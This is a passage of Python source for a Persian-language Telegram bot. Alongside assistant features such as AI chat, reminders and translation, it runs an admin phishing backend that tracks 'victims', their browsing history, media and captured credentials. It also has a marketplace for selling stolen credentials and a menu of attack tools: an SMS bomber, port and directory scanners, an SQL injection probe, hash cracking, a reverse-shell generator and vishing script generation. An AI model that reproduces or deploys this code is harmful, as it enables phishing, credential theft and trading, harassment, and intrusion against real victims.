                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
                if rows: hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows]); await query.message.reply_text(f"🌐 Visited: {hist}")
                else: await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
            conn.close()

        elif data.startswith("delete_victim|"):
            if user_id != ADMIN_USER_ID: return
            token = data.split("|")[1]
            conn = get_db_connection()
            conn.execute("DELETE FROM victims WHERE token=?", (token,))
            conn.execute("DELETE FROM logs WHERE token=?", (token,))
            conn.execute("DELETE FROM media WHERE token=?", (token,))
            conn.execute("DELETE FROM credentials WHERE token=?", (token,))
            conn.commit(); conn.close()
            await query.edit_message_text(f"🗑 قربانی {token} حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="victims_list")]]))

        elif data == "users_list":
            if user_id != ADMIN_USER_ID: return
            conn = get_db_connection()
            users = conn.execute("SELECT * FROM private_chats ORDER BY join_date DESC LIMIT 50").fetchall()
            conn.close()
            if not users:
                await query.edit_message_text("👥 هیچ کاربری ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
                return
            text = f"👥 <b>لیست کاربران</b> ({len(users)} نفر)\n\n"
            for i, u in enumerate(users, 1):
                name = u['first_name'] + (" " + u['last_name'] if u['last_name'] else "")
                text += f"{i}. <b>{name}</b> (@{u['username']}) — <code>{u['user_id']}</code>\n"
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "backup_now":
            if user_id != ADMIN_USER_ID: return
            try:
                backup_name = f"victims_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
                shutil.copy(DATABASE, backup_name)
                conn = get_db_connection()
                conn.execute("INSERT INTO backups (timestamp) VALUES (?)", (datetime.now().isoformat(),))
                conn.commit(); conn.close()
                await query.edit_message_text(f"💾 پشتیبان‌گیری با موفقیت انجام شد.\nفایل: {backup_name}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
            except Exception as e:
                await query.answer(f"خطا در پشتیبان‌گیری: {e}", show_alert=True)

        elif data == "tasks_menu":
            keyboard = [
                [InlineKeyboardButton("📋 مشاهده", callback_data="view_tasks"), InlineKeyboardButton("➕ افزودن", callback_data="add_task_prompt")],
                [InlineKeyboardButton("✅ انجام", callback_data="done_task_prompt"), InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]
            await query.edit_message_text("📋 کارها:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data == "view_tasks":
            conn = get_db_connection(); rows = conn.execute("SELECT id, task FROM todos WHERE user_id=? AND done=0", (user_id,)).fetchall(); conn.close()
            if not rows: await query.edit_message_text("📭 خالی.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="tasks_menu")]]))
            else:
                text = "\n".join([f"{r['id']}. {r['task']}" for r in rows])
                await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="tasks_menu")]]))
        elif data == "add_task_prompt": context.user_data['awaiting_addtask'] = True; await query.edit_message_text("📝 شرح کار:")
        elif data == "done_task_prompt": context.user_data['awaiting_done_task'] = True; await query.edit_message_text("✅ شماره کار:")

        else: await query.answer("تعریف نشده")

    except Exception as e:
        app.logger.error(f"Button error: {e}")
        await query.edit_message_text("❌ خطا. دوباره تلاش کنید.")

# -------------------- Message Handler --------------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    user_id = msg.from_user.id

    if msg.chat.type == 'private':
        conn = get_db_connection()
        conn.execute("INSERT OR IGNORE INTO private_chats (user_id, username, first_name, last_name, join_date) VALUES (?, ?, ?, ?, ?)",
                     (user_id, msg.from_user.username or "ندارد", msg.from_user.first_name or "", msg.from_user.last_name or "", datetime.now().isoformat()))
        conn.commit(); conn.close()
    elif msg.chat.type in ['group', 'supergroup']:
        conn = get_db_connection()
        conn.execute("INSERT OR REPLACE INTO groups (chat_id, title) VALUES (?, ?)", (msg.chat.id, msg.chat.title or "نامشخص"))
        conn.commit(); conn.close()

    if random.random() < 0.2:
        try: await msg.set_reaction(reaction=[random.choice(REACTIONS)], is_big=False)
        except: pass

    # Awaiting states
    if context.user_data.get('awaiting_group_message'):
        group_id = context.user_data.pop('awaiting_group_message')
        try: await context.bot.send_message(chat_id=group_id, text=msg.text); await msg.reply_text("✅ ارسال شد.")
        except Exception as e: await msg.reply_text(f"❌ {e}")
        return
    if context.user_data.get('awaiting_user_message'):
        target_user = context.user_data.pop('awaiting_user_message')
        try: await context.bot.send_message(chat_id=target_user, text=msg.text); await msg.reply_text(f"✅ به کاربر {target_user} ارسال شد.")
        except Exception as e: await msg.reply_text(f"❌ {e}")
        return
    if context.user_data.get('awaiting_sell_token'):
        context.user_data['sell_token'] = msg.text.strip()
        context.user_data['awaiting_sell_token'] = False; context.user_data['awaiting_sell_price'] = True
        await msg.reply_text("💰 قیمت (امتیاز):")
        return
    if context.user_data.get('awaiting_sell_price'):
        try: price = int(msg.text.strip())
        except: await msg.reply_text("❌ عدد وارد کنید."); return
        token = context.user_data.get('sell_token')
        conn = get_db_connection()
        cred = conn.execute("SELECT * FROM credentials WHERE token=?", (token,)).fetchone()
        if not cred: await msg.reply_text("❌ اطلاعات یافت نشد."); conn.close(); context.user_data.clear(); return
        conn.execute("INSERT INTO listings (seller_id, token, price, sold, listed_at) VALUES (?, ?, ?, 0, ?)", (user_id, token, price, datetime.now().isoformat()))
        conn.commit(); lid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]; conn.close()
        context.user_data.clear()
        await msg.reply_text(f"✅ آگهی با کد <code>{lid}</code> ایجاد شد.", parse_mode="HTML")
        return
    if context.user_data.get('awaiting_search'):
        context.user_data['awaiting_search'] = False
        results = search_web(msg.text)
        if results is None: await msg.reply_text("⚠️ جستجو فعال نیست."); return
        if not results: await msg.reply_text("❌ نتیجه‌ای یافت نشد."); return
        text = "🔍 نتایج:\n\n" + "\n".join(f"{i+1}. {r['title']}\n{r['href']}" for i, r in enumerate(results))
        await msg.reply_text(text[:4000], parse_mode="HTML")
        return
    if context.user_data.get('awaiting_imagine'):
        context.user_data['awaiting_imagine'] = False
        await msg.reply_text("🎨 در حال ساخت...")
        img_data = generate_image(msg.text)
        if img_data: await msg.reply_photo(photo=io.BytesIO(img_data))
        else: await msg.reply_text("❌ خطا")
        return
    if context.user_data.get('awaiting_translate'):
        context.user_data['awaiting_translate'] = False
        translated = ask_groq(f"ترجمه کن به فارسی:\n{msg.text}", user_id)
        await msg.reply_text(f"🌐 ترجمه:\n{translated}")
        return
    if context.user_data.get('awaiting_summarize'):
        context.user_data['awaiting_summarize'] = False
        summary = ask_groq(f"خلاصه کن:\n{msg.text}", user_id)
        await msg.reply_text(f"📝 خلاصه:\n{summary}")
        return
    if context.user_data.get('awaiting_remind_time'):
        t = msg.text.strip()
        try: h, m = map(int, t.split(':'))
        except: await msg.reply_text("❌ فرمت HH:MM"); context.user_data['awaiting_remind_time'] = False; return
        now = datetime.now(); dt = now.replace(hour=h, minute=m, second=0, microsecond=0)
        if dt <= now: dt += timedelta(days=1)
        context.user_data['remind_dt'] = dt; context.user_data['awaiting_remind_time'] = False; context.user_data['awaiting_remind_msg'] = True
        await msg.reply_text("📝 پیام یادآوری:")
        return
    if context.user_data.get('awaiting_remind_msg'):
        dt = context.user_data.pop('remind_dt'); message = msg.text
        conn = get_db_connection(); conn.execute("INSERT INTO reminders (user_id, remind_time, message) VALUES (?, ?, ?)", (user_id, dt.isoformat(), message)); conn.commit(); conn.close()
        context.job_queue.run_once(send_reminder, when=dt, data={"user_id": user_id, "text": message})
        context.user_data['awaiting_remind_msg'] = False
        await msg.reply_text(f"✅ تنظیم شد برای {dt.strftime('%H:%M')}")
        return
    if context.user_data.get('awaiting_execute_lang'):
        lang = msg.text.strip().lower(); context.user_data['execute_lang'] = lang; context.user_data['awaiting_execute_lang'] = False; context.user_data['awaiting_execute_code'] = True
        await msg.reply_text("💻 کد:")
        return
    if context.user_data.get('awaiting_execute_code'):
        lang = context.user_data.pop('execute_lang'); code = msg.text; output = execute_code(lang, code); context.user_data['awaiting_execute_code'] = False
        await msg.reply_text(f"💻 خروجی:\n<pre>{output[:3000]}</pre>", parse_mode="HTML")
        return
    if context.user_data.get('awaiting_addtask'):
        task = msg.text; conn = get_db_connection(); conn.execute("INSERT INTO todos (user_id, task, created_at) VALUES (?, ?, ?)", (user_id, task, datetime.now().isoformat())); conn.commit(); conn.close()
        context.user_data['awaiting_addtask'] = False; await msg.reply_text("✅ اضافه شد.")
        return
    if context.user_data.get('awaiting_done_task'):
        try: tid = int(msg.text)
        except: await msg.reply_text("❌ عدد وارد کنید."); context.user_data['awaiting_done_task'] = False; return
        conn = get_db_connection(); conn.execute("UPDATE todos SET done=1 WHERE id=? AND user_id=?", (tid, user_id)); conn.commit(); conn.close()
        context.user_data['awaiting_done_task'] = False; await msg.reply_text("✅ انجام شد.")
        return
    if context.user_data.get('awaiting_sentiment'):
        sentiment = analyze_sentiment(msg.text); context.user_data['awaiting_sentiment'] = False
        await msg.reply_text(f"📊 احساس: {sentiment}")
        return

    # Hacking tool states
    if context.user_data.get('awaiting_sms_phone'):
        phone = msg.text.strip(); context.user_data['awaiting_sms_phone'] = False
        await msg.reply_text(sms_bomber(phone, 10))
        return
    if context.user_data.get('awaiting_portscan'):
        host = msg.text.strip(); context.user_data['awaiting_portscan'] = False
        ports = port_scan(host)
        await msg.reply_text(f"🔍 پورت‌های باز {host}: {', '.join(map(str, ports))}" if ports else "❌ هیچ پورت بازی نیست.")
        return
    if context.user_data.get('awaiting_subdomain'):
        domain = msg.text.strip(); context.user_data['awaiting_subdomain'] = False
        res = subdomain_finder(domain)
        await msg.reply_text("🌐 زیردامنه‌ها:\n" + "\n".join(res) if res else "❌ پیدا نشد.")
        return
    if context.user_data.get('awaiting_dirbrute'):
        host = msg.text.strip(); context.user_data['awaiting_dirbrute'] = False
        res = dir_bruteforce(host)
        await msg.reply_text("📁 مسیرها:\n" + "\n".join(res) if res else "❌ پیدا نشد.")
        return
    if context.user_data.get('awaiting_ipinfo'):
        ip = msg.text.strip(); context.user_data['awaiting_ipinfo'] = False
        info = get_ip_info(ip)
        if info:
            text = f"🌍 {info['query']}\nکشور: {info['country']}\nشهر: {info['city']}\nISP: {info['isp']}\nORG: {info['org']}"
            await msg.reply_text(text)
        else: await msg.reply_text("❌ اطلاعات یافت نشد.")
        return
    if context.user_data.get('awaiting_sqli'):
        url = msg.text.strip(); context.user_data['awaiting_sqli'] = False
        try:
            r = requests.get(url + "'", timeout=5)
            if "sql" in r.text.lower() or "error" in r.text.lower(): await msg.reply_text("⚠️ آسیب‌پذیر!")
            else: await msg.reply_text("✅ سالم")
        except: await msg.reply_text("❌ خطا")
        return
    if context.user_data.get('awaiting_robots'):
        url = msg.text.strip(); context.user_data['awaiting_robots'] = False
        robots = check_robots_txt(url)
        await msg.reply_text(f"🤖 robots.txt:\n{robots}" if robots else "❌ پیدا نشد.")
        return
    if context.user_data.get('awaiting_hash_text'):
        algo = context.user_data.pop('hash_algo', 'md5'); context.user_data['awaiting_hash_text'] = False
        h = generate_hash(msg.text.strip(), algo)
        await msg.reply_text(f"🔐 {algo.upper()}: <code>{h}</code>" if h else "❌ خطا", parse_mode="HTML")
        return
    if context.user_data.get('awaiting_crackhash'):
        context.user_data['awaiting_crackhash'] = False
        res = crack_hash(msg.text.strip())
        await msg.reply_text(f"🗝 {res}" if res else "❌ پیدا نشد")
        return
    if context.user_data.get('awaiting_shell'):
        context.user_data['awaiting_shell'] = False
        try: ip, port = msg.text.strip().split(':')
        except: await msg.reply_text("❌ فرمت IP:PORT"); return
        keyboard = [[InlineKeyboardButton(l, callback_data=f"shell_{l}|{ip}|{port}")] for l in ["bash","python","php","nc","ruby","perl"]]
        keyboard.append([InlineKeyboardButton("بازگشت", callback_data="hack_system")])
        await msg.reply_text("🐚 زبان:", reply_markup=InlineKeyboardMarkup(keyboard))
        return
    if context.user_data.get('awaiting_email_header'):
        header = msg.text.strip(); context.user_data['awaiting_email_header'] = False
        await msg.reply_text(f"📧 تحلیل:\n{analyze_email_header(header)}")
        return
    if context.user_data.get('awaiting_cache'):
        url = msg.text.strip(); context.user_data['awaiting_cache'] = False
        await msg.reply_text(cache_poisoning_test(url))
        return
    if context.user_data.get('awaiting_open_redirect'):
        url = msg.text.strip(); context.user_data['awaiting_open_redirect'] = False
        await msg.reply_text(f"🔀 تست Open Redirect روی {url}: شبیه‌سازی")
        return
    if context.user_data.get('awaiting_file_upload'):
        url = msg.text.strip(); context.user_data['awaiting_file_upload'] = False
        await msg.reply_text(file_upload_injection_test(url))
        return
    if context.user_data.get('awaiting_timing'):
        parts = msg.text.strip().split()
        if len(parts) < 2: await msg.reply_text("❌ فرمت: url param"); return
        url, param = parts[0], parts[1]; context.user_data['awaiting_timing'] = False
        await msg.reply_text(timing_attack(url, param))
        return
    if context.user_data.get('awaiting_mass'):
        parts = msg.text.strip().split()
        if len(parts) < 2: await msg.reply_text("❌ فرمت: url param=val"); return
        url, params = parts[0], ' '.join(parts[1:]); context.user_data['awaiting_mass'] = False
        await msg.reply_text(mass_assignment_test(url, params))
        return
    if context.user_data.get('awaiting_git'):
        repo = msg.text.strip(); context.user_data['awaiting_git'] = False
        await msg.reply_text(git_secret_scanner(repo))
        return
    if context.user_data.get('awaiting_dns'):
        domain = msg.text.strip(); context.user_data['awaiting_dns'] = False
        await msg.reply_text(dangling_dns_check(domain))
        return
    if context.user_data.get('awaiting_qr'):
        url = msg.text.strip(); context.user_data['awaiting_qr'] = False
        await msg.reply_text(qr_attack_payload(url))
        return
    if context.user_data.get('awaiting_vishing'):
        parts = msg.text.strip().split(',')
        if len(parts) < 2: await msg.reply_text("❌ فرمت: نام,سناریو"); return
        target, scenario = parts[0], parts[1]; context.user_data['awaiting_vishing'] = False
        await msg.reply_text(vishing_script(target, scenario))
        return

    # AI reply (ریپلای)
    if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
        if AI_ENABLED and GROQ_API_KEY:
            thinking_msg = await msg.reply_text("🤔 ...")
            answer = ask_groq(msg.text, user_id=user_id)
            if len(answer) > 4000:
                parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
                await thinking_msg.delete()
                for part in parts: await msg.reply_text(part)
            else: await thinking_msg.edit_text(answer)
        return

    # learned words
    text_lower = msg.text.lower()
    conn = get_db_connection(); rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
    for row in rows:
        if row['keyword'] in text_lower: await msg.reply_text(row['response']); conn.close(); return
    conn.close()

    # AI private
    if msg.chat.type == 'private' and AI_ENABLED and GROQ_API_KEY:
        thinking_msg = await msg.reply_text("🤔 ...")
        answer = ask_groq(msg.text, user_id=user_id)
        if len(answer) > 4000:
            parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
            await thinking_msg.delete()
            for part in parts: await msg.reply_text(part)
        else: await thinking_msg.edit_text(answer)

# -------------------- Voice & Reaction Handlers --------------------
async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not AI_ENABLED or not GROQ_API_KEY: return
    msg = update.message; user_id = msg.from_user.id
    is_reply_to_bot = msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id
    if not is_reply_to_bot and msg.chat.type != 'private': return
    voice = msg.voice; file = await voice.get_file(); file_bytes = await file.download_as_bytearray()
    transcript = transcribe_audio(file_bytes)
    if not transcript: await msg.reply_text("❌ نتونستم صدات رو تشخیص بدم."); return
    thinking_msg = await msg.reply_text("🤔 ..."); answer = ask_groq(transcript, user_id=user_id)
    audio_data = await text_to_speech_async(answer)
    if audio_data:
        await msg.reply_voice(voice=io.BytesIO(audio_data)); await thinking_msg.delete()
    else:
        if len(answer) > 4000:
            parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]; await thinking_msg.delete()
            for part in parts: await msg.reply_text(part)
        else: await thinking_msg.edit_text(answer)

async def handle_reaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reaction = update.message_reaction
    if not reaction: return
    chat_id = reaction.chat.id; message_id = reaction.message_id; user = reaction.user
    if not user: return
    try:
        msg = await context.bot.get_message(chat_id=chat_id, message_id=message_id)
        if msg and msg.from_user.id == context.bot.id:
            await context.bot.send_message(chat_id=chat_id, text=f"😍 ممنون از واکنشت {user.mention_html()}!", parse_mode="HTML")
    except Exception as e: app.logger.error(f"Reaction error: {e}")

# --- search_victim (missing function) ---
async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ فقط مدیر.")
        return
    if not context.args:
        await update.message.reply_text("📝 /searchvictim <token>")
        return
    token = context.args[0]
    conn = get_db_connection()
    victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
    if victim:
        text = (f"<b>قربانی پیدا شد:</b>\n"
                f"<b>توکن:</b> <code>{victim['token']}</code>\n"
                f"<b>IP:</b> {victim['ip']}\n"
                f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
                f"<b>نوع فیشینگ:</b> {victim['phishing_type']}")
        keyboard = [[InlineKeyboardButton("مشاهده جزئیات", callback_data=f"victim_detail|{token}")]]
        await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text("قربانی با این توکن یافت نشد.")
    conn.close()

# -------------------- Main --------------------
def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    init_db()
    application = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).write_timeout(30).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_cmd))
    application.add_handler(CommandHandler("learn", learn_command))
    application.add_handler(CommandHandler("unlearn", unlearn_command))
    application.add_handler(CommandHandler("wordlist", wordlist_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("send", send_user_command))
    application.add_handler(CommandHandler("search", search_command))
    application.add_handler(CommandHandler("imagine", imagine_command))
    application.add_handler(CommandHandler("translate", translate_command))
    application.add_handler(CommandHandler("summarize", summarize_command))
    application.add_handler(CommandHandler("remind", remind_command))
    application.add_handler(CommandHandler("execute", execute_command))
    application.add_handler(CommandHandler("addtask", add_task_command))
    application.add_handler(CommandHandler("tasks", tasks_command))
    application.add_handler(CommandHandler("done", done_command))
    application.add_handler(CommandHandler("sentiment", sentiment_command))
    application.add_handler(CommandHandler("persona", persona_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("searchvictim", search_victim))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.VOICE, handle_voice))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageReactionHandler(handle_reaction))
    application.run_polling()
